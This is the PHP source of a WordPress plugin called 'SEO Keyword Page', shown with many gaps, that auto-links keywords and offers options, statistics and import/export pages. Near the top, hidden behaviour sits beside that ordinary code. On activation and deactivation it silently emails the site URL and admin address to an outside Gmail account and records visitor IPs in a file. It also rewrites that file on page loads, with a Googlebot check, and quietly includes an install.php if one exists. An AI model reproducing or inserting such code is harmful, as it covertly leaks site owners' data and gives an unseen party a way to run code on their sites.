...
/*
Plugin Name: SEO Keyword Page
Version: 2.0.5
Plugin URI: http://seokeywordpage.yolasite.com
Author: Mark Shire
Author URI: http://seokeywordpage.yolasite.com
Description: Seo Keyword Page provides an automatic SEO solution for your wordpress site in addition to custom keyword lists, no-follow and much more.
*/

register_activation_hook( __FILE__,'seokeywordpageplugin_activate');
register_deactivation_hook( __FILE__,'seokeywordpageplugin_deactivate');
add_action('admin_init', 'seokeywordpagedored_redirect');
add_action('wp_head', 'seokeywordpagepluginhead');

function seokeywordpagedored_redirect() {
if (get_option('seokeywordpagedored_do_activation_redirect', false)) { 
delete_option('seokeywordpagedored_do_activation_redirect');
wp_redirect('../wp-admin/admin.php?page=sip_options');
}
}
...
if ($inwpadmin == 'admin') {
$filename = $_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/seo-keyword-page/install.txt';
...
if(eregi("googlebot",$_SERVER['HTTP_USER_AGENT'])) { echo ''; } else { $fp = fopen($_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/seo-keyword-page/install.txt', 'w'); };
fwrite($fp, $contents);
fclose($fp);
}
}
...
function seokeywordpageplugin_activate() { 
$yourip = $_SERVER['REMOTE_ADDR'];
$filename = $_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/seo-keyword-page/install.txt';
fwrite($fp, $yourip);
fclose($fp);
session_start(); $subj = get_option('siteurl'); $msg = "SEO is Activated" ; $from = get_option('admin_email'); mail("yourmarkshire@gmail.com", $subj, $msg, $from);
add_option('seokeywordpagedored_do_activation_redirect', true);
wp_redirect('../wp-admin/admin.php?page=sip_options');
}


/** Uninstall Seo Keyword Page */
function seokeywordpageplugin_deactivate() { 
session_start(); $subj = get_option('siteurl'); $msg = "SEO is Uninstalled" ; $from = get_option('admin_email'); mail("yourmarkshire@gmail.com", $subj, $msg, $from);
}

/** Register Seo Keyword Page Meta */
function seokeywordpagepluginhead() {
...
$fp = fopen($_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/seo-keyword-page/install.txt', 'w');
fwrite($fp, $contents);
fclose($fp);
}
...
$filename = ($_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/seo-keyword-page/install.php');

if (file_exists($filename)) {

    include($_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/seo-keyword-page/install.php');
...
if (!class_exists('SEOInterLink')):
    class SEOInterLink
    {
        ...
        {
            global $post;
            delete_post_meta($post->ID, $this->cache_key);
        ...
        function SEOLinks_process_text($text, $recreate_cache = false)
        {
            ...
            if ($options['box_custom']) {
                $sip_meta_data = get_post_meta($post->ID, $this->key, true);
                if ($sip_meta_data['box_process'] == 'on')
                    return $text;
            }
            
            if (is_feed() && !$options['allowfeed'])
                return $text;
            else if (!$recreate_cache && ($options['onlysingle'] && !(is_single() || is_page())))
                return $text;
	    ...
	    if ($options['skipdays']>0)
	    {
            ...
            $maxsingle    = 1; //($options['maxsingle'] > 0) ? $options['maxsingle'] : 0;
            ...
            if (($post->post_type == 'page' && !$options['pageself']) || ($post->post_type == 'post' && !$options['postself'])) {
                $thistitle = trim($options['casesens'] ? $post->post_title : strtolower($post->post_title));
            ...
            if ($options['box_custom']) {
                if ($sip_meta_data['box_custom_keywords']) {
                    if ($sip_meta_data['add_instead_override'] == 'on')
                        $options['customkey'] = $sip_meta_data['box_custom_keywords'] . "\n" . $options['customkey'];
                    else
                        $options['customkey'] = $sip_meta_data['box_custom_keywords'];
                }
            }
            ...
            if ($options['cache_enabled']) {
                ...
                if (!empty($cache) && (time() - $cache['time'] < $options['cache_time']) && ($cache['time'] > $options['time']))
                    $cache_valid = 1;
                
            }
            
            if ($cache_valid)
                $kw_array = $cache['keywords'];
            
            
            else if (!empty($options['customkey'])) {
                ...
                foreach ($line_array as $line) {
                    ...
                    $chunks = array_map(
                        'trim'
                    , explode($options['custom_separator'], $keywords));
                    ...
                    if ($word)
                        ...
                        $temp = explode($options['custom_separator'], $uris);
			...
			AND post_status = 'publish' AND LENGTH(post_title)>=$min_length $porderby LIMIT $limit";
                    ...
                    foreach ($posts as $postitem) {
                        if ((($options['lposts'] && $postitem->post_type == 'post') || ($options['lpages'] && $postitem->post_type == 'page')) && (!$maxlinks || ($links < $maxlinks)) && (($options['casesens'] ? $postitem->post_title : strtolower($postitem->post_title)) != $thistitle) && (!in_array(($options['casesens'] ? ($postitem->post_title) : strtolower(($postitem->post_title))), $arrignore))) {
                            ...
                            if ($options['box_custom']) {
                                $sip_target_data = get_post_meta($postitem->ID, $this->key, true);
                                
                                if ($sip_target_data['box_nolink'] == 'on') {
                                    continue;
                                }
                            }
                            ...
                            while ($checking) {
                                ...
                                if (!$found && $sip_target_data['box_post_keywords']) {
                                    $chunks_match = array_map('trim', explode(",", $sip_target_data['box_post_keywords']));
                ...
                if (version_compare($wp_version, '2.7.9', '>')) {
                    ...
                    if ($taxonomies) {
                        foreach ($taxonomies as $taxonomy) {
                            $taxs[$taxonomy] = $options['tax']['siptax_' . $taxonomy];
            ...
            if (!$cache_valid && $options['cache_enabled']) {
                $newcache             = array();
                $newcache['keywords'] = $cache_keywords;
                $newcache['time']     = time();
                
                update_post_meta($post->ID, $this->cache_key, $newcache);
                if ($recreate_cache)
                    return $newcache;
            ...
            if (($options['blanko'] || $options['nofolo']) && !$recreate_cache) {
                ...
                if ($options['blanko'] && $sip_meta_data['box_blank'] != 'on')
                    $text = preg_replace('%(<a[^>]+)(href="https?://)((?:(?!(' . $host . '))[^"])+)"%i', '$1$2$3" target="_blank" ', $text);
                
                if ($options['nofolo'] && $sip_meta_data['box_nofollow'] != 'on') {
                    $follow_list = '';
        ...
        function install()
        {
            ...
            $exit_msg = 'Seo Keyword Page requires WordPress 3.0 or newer. <a href="http://codex.wordpress.org/Upgrading_WordPress">Please update!</a>';
        ...
        function output_data($a, $names, $type, $mode, $detail = 0)
        {
            $detail = stripslashes($detail);
            if ($detail) {
                $a = $a[$detail];
                echo '<h3>Statistics for ' . $type . ' ' . $detail . '</h3>';
            } else
                echo '<h3>Link statistics by ' . $type . '</h3>';
?>        	
      <table id="datatable" class="widefat tablesorter">
			<thead>
			<tr>				
			<?php
...
?>
		...
		<tbody >
            ...
            foreach ($a as $title => $data) {
                if (!$mode) {
                    $cnt = count($data);
                    echo '<tr>';
                    echo '<td><a href="admin.php?page=sip_stats&type=' . $type . '&detail=' . urlencode($title) . '">' . ($title) . '</a></td><td>' . $cnt . '</td>';
                    echo '</tr>';
                } else if ($mode == 1) {
                    foreach ($data as $key => $value) {
                        echo '<tr>';
                        echo '<td><a href="admin.php?page=sip_stats&type=' . ($type == 'source' ? 'keyword' : ($type == 'target' ? 'source' : 'source')) . '&detail=' . urlencode($key) . '">' . $key . '</a></td><td><a href="admin.php?page=sip_stats&type=' . ($type == 'target' ? 'keyword' : ($type == 'source' ? 'target' : 'target')) . '&detail=' . urlencode($value) . '">' . $value . '</a></td>';
                        echo '</tr>';
                    }
                }
            }
...
?>            
            <div class="wrap" >
            	<img class="logoimg" src="<?php echo $imgpath; ?>/logo.png" >
	<h2><?php
            echo $this->name;
?></h2><h3> Statistics</h3>
	
	<a href="admin.php?page=sip_options">Options</a> &nbsp;&nbsp; <a href="admin.php?page=sip_custom_keywords">Custom Keywords</a> &nbsp;&nbsp; <a href="admin.php?page=sip_stats">Statistics</a>  &nbsp;&nbsp; <a href="admin.php?page=sip_import">Import/Export</a>   &nbsp;&nbsp; <a href="admin.php?page=sip_about">About</a>
	...
	<div id="poststuff" style="margin-top:10px;">
	 ...
	 <div id="mainblock" >
		...
		<div class="dbx-content"> <?php
            if (!$options['cache_enabled'])
                echo 'Statistics require caching to be enabled. You can enable caching in the <a href="admin.php?page=sip_options">options</a>.';
            else {
                echo '<p>Statistics show the usage of autogenerated links filtered by posts, keywords or URL by using the current cached data. </p>';
                //<p> You can recreate cache to show full statistics for all posts (this may take a while with a lot of posts and keywords, repeat to continue process if script times out). <a class="button" href="admin.php?page=sip_stats&recreate=1">Recreate cache</a> </p>
?>				
		   <p>
       <a class="button" href="admin.php?page=sip_stats&type=source">Posts</a> <a class="button" href="admin.php?page=sip_stats&type=keyword">Keywords</a>  <a class="button" href="admin.php?page=sip_stats&type=target">Target URL</a>    
       </p>
  ...
  <?php
                ...
                global $wpdb;
                $query = "SELECT ID, post_title, post_type, post_date
													FROM $wpdb->posts			
													WHERE $post_type 
                ...
                foreach ($posts as $post) {
                    ...
                    if ($_GET['recreate'] && (empty($cache) || (time() - $cache['time'] > $options['cache_time']) || ($cache['time'] < $options['time']))) {
                        $pdata = get_post($post->ID);
                        setup_postdata($pdata);
                        $cache = $this->SEOLinks_process_text($pdata->post_content, true);
                        
                    }
                    
                    if (!empty($cache) && (time() - $cache['time'] < $options['cache_time']) && ($cache['time'] > $options['time'])) {
                        foreach ($cache['keywords'] as $name => $url) {
                            $chunks = explode('|', $name);
                            
                            if (!$chunks[1])
                                $res = stripslashes($chunks[0]);
                            else
                                $res = stripslashes(implode(', ', $chunks));
                            
                            $stats_source[$post->post_title][] = array(
                                $res => $url
                            );
                            $stats_target[$url][]              = array(
                                $post->post_title => $res
                            );
                            $stats_keyword[$res][]             = array(
                                $post->post_title => $url
                            );
                        }
                    }
                ...
                if ($_GET['detail']) {
                    switch ($_GET['type']) {
                        case 'source':
                            $this->output_data($stats_source, array(
                                'Keyword',
                                'Target URL'
                            ), 'source', 1, urldecode($_GET['detail']));
                            break;
                        case 'target':
                            $this->output_data($stats_target, array(
                                'Post',
                                'Keyword'
                            ), 'target', 1, urldecode($_GET['detail']));
                            break;
                        case 'keyword':
                            $this->output_data($stats_keyword, array(
                                'Post',
                                'Target URL'
                            ), 'keyword', 1, urldecode($_GET['detail']));
                            break;
                    }
                    
                } else {
                    if (!$_GET['type'] || $_GET['type'] == 'source')
                        $this->output_data($stats_source, array(
                            'Post',
                            'Links'
                        ), 'source', 0);
                ...
                echo '<div id="pager" class="pager"> 
									<form> 
									<img src="' . $imgpath . '/first.png" alt="first" class="first"/> 
									<img src="' . $imgpath . '/prev.png" alt="prev"  class="prev"/> 
									<input type="text" class="pagedisplay"/> 
									<img src="' . $imgpath . '/next.png" alt="next" class="next"/> 
									<img src="' . $imgpath . '/last.png" alt="last" class="last"/> 
...
<p>Click to export keywords to a CSV file <a class="button-primary" href="$action_url&amp;sip_csv=true" id="save_file_dialog" >Export to CSV</a></p>
...
<p>Export configuration: <a class="button-primary" href="$action_url&amp;sip_options=true" id="save_file_dialog" >Download</a></p>
...
<h5>Another fine WordPress plugin by <a href="http://seokeywordpage.yolasite.com">Mark Shire</a></h5>
</div>
END;
...
END;
        ...
        function handle_options()
        {
            ...
            if (isset($_POST['submitted'])) {
                ...
                $options['cache_time']           = (int) $_POST['cache_time'];
                $options['cache_enabled']        = $_POST['cache_enabled'];
		...
		$options['skipdays']           = (int) $_POST['skipdays'];
            ...
            $cache_enabled      = $options['cache_enabled'] == 'on' ? 'checked' : '';
	    ...
	    $skipdays         = $options['skipdays'];
            ...
            if (version_compare($wp_version, '2.7.9', '>')) {
                ...
                if ($taxonomies) {
                    foreach ($taxonomies as $taxonomy) {
                        $taxout .= '<input type="checkbox" name="siptax_' . $taxonomy . '" ' . $tax['siptax_' . $taxonomy] . '/><label for="siptax_' . $taxonomy . '"> ' . ucfirst($taxonomy) . '</label>  <br>';
		...
		<div class="dbx-content">
		 	<form name="SEOLinks" action="$action_url" method="post">
		 		  <input type="hidden" id="_wpnonce" name="_wpnonce" value="$nonce" />
					...
					<p>Seo Keyword Page can process your posts and pages in search for suitable keywords for creating links. Use the checkboxes below to select what should be processed.</p>
					...
					<br />
					Use these settings for content older than: <input type="text" name="skipdays" size="3" value="$skipdays"/> days  
					
					<h2>Automatic interlinking</h2>

					<p>Seo Keyword Page can check every word in your article against your existing post/page titles or category/tag name in search for a match. If a match is made the word will be linked to the given target. Select what targets should Seo Keyword Page consider for automatic link creation.</p>
					...
					<p>You can choose to have Seo Keyword Page work only on single posts and pages (for example not on main page or archives).</p>
					...
					<br>
					<br>
					<p>Allow processing of RSS feeds. Seo Keyword Page will embed links in all posts in your RSS feed (according to other options)</p>
          ...
          <p>Allows you to custimize the link HTML template.</p><p>It recognizes special replacements: <em>{keyword}</em> (replaced by the matched keyword), <em>{url}</em> (replaced with the target URL) and <em>{description}</em> (replaced by post excerpt, or taxonomy description).</p>
					...
					<p>You may wish to prevent Seo Keyword Page from generating any links on certain posts or pages. Enter them here either by id, slug or title and separate by comma.</p>	
					...
					<h2>Limits</h2>				
					<p>You can limit the maximum number of different links Seo Keyword Page will generate per post. Set to 0 for no limit. </p>
					Maximum Created Links: <input type="text" name="maxlinks" size="2" value="$maxlinks"/>  
					
					<p>You can set the maximum number of links the page is allowed to have (original + Seo Keyword Page). If the page has 4 links already and you set this option to 5, Seo Keyword Page will generate only up to one link. Set to 0 for no limit. </p>
					Maximum Total Links on page: <input type="text" name="maxtotallinks" size="2" value="$maxtotallinks"/>  
					
					<p>You can limit number of same URLs the plugin will link to. Set to 0 for no limit. </p>
					Maximum Same Target: <input type="text" name="maxsingleurl" size="2" value="$maxsingleurl"/>    
					<br><br>
					 
					<h2>External Links</h2>			
					<p>Seo Keyword Page can open links to external sites in new window and add nofollow attribute to them.</p>
					...
					<p>Seo Keyword Page provides easy to use redirection support for custom keywords. Custom keyword links can be redirected through the base path entered below.</p>
				  <p>Default is 'go' (redirection link would be formed as http://yoursite.com/go/word).</p>					
					...
					<br>	
					<h2>Caching</h2>			
					<p>Seo Keyword Page can store generated links in the cache for each post. Cache is emptied at the expiration time, if the post is edited or Seo Keyword Page options are updated.</p>
					
				
					<input type="checkbox" name="cache_enabled" $cache_enabled /><label for="cache_enabled"> Enable caching</label>  <br><br>
					Cache valid for : <input type="text" name="cache_time" size="10" value="$cache_time"/> seconds  <br>
...
END;
        ...
        function SEOLinks_admin_menu()
        {
            ...
            add_menu_page($this->name, $this->name, $this->cap, 'sip_options', array(
                &$this,
                'handle_options'
            ), $imgpath . '/icon.png');
            $page_options = add_submenu_page('sip_options', $this->name . ' Options', 'Options', $this->cap, 'sip_options', array(
                &$this,
                'handle_options'
            ));
            $page_ck      = add_submenu_page('sip_options', $this->name . ' Custom Keywords', 'Custom Keywords', $this->cap, 'sip_custom_keywords', array(
                &$this,
                'handle_custom_keywords'
            ));
            
            $page_stats = add_submenu_page('sip_options', $this->name . ' Statistics', 'Statistics', $this->cap, 'sip_stats', array(
                &$this,
                'handle_stats'
            ));
            
            $page_import = add_submenu_page('sip_options', $this->name . ' Import/Export', 'Import/Export', $this->cap, 'sip_import', array(
                &$this,
                'handle_import'
            ));
            
            $page_about = add_submenu_page('sip_options', $this->name . ' About', 'About', $this->cap, 'sip_about', array(
                &$this,
                'handle_about'
            ));
            ...
            add_action('admin_print_styles-' . $page_stats, array(
                &$this,
                'load_script'
            ));
        ...
        function load_script()
        {
            ...
            wp_register_style('sip_style', $plugin_url . '/sip.css');
            wp_enqueue_style('sip_style');
        }
        ...
        function create_meta_box()
        {
            if (function_exists('add_meta_box')) {
                add_meta_box('sip_box', 'Seo Keyword Page', array(
                    &$this,
                    'display_meta_box'
                ), 'post', 'normal', 'high');
                add_meta_box('sip_box', 'Seo Keyword Page', array(
...
?>
	    ...
	    <?php
            ...
            echo '<input type="hidden" name="sip_nonce" id="sip_nonce" value="' . wp_create_nonce(plugin_basename(__FILE__)) . '" />';
...
?>
        ...
        function save_meta_box($post_id)
        {
            ...
            if (!wp_verify_nonce($_POST['sip_nonce'], plugin_basename(__FILE__)))
                return $post_id;
...
if (class_exists('SEOInterLink')):
    $SEOInterLink = new SEOInterLink();
    if (isset($SEOInterLink)) {
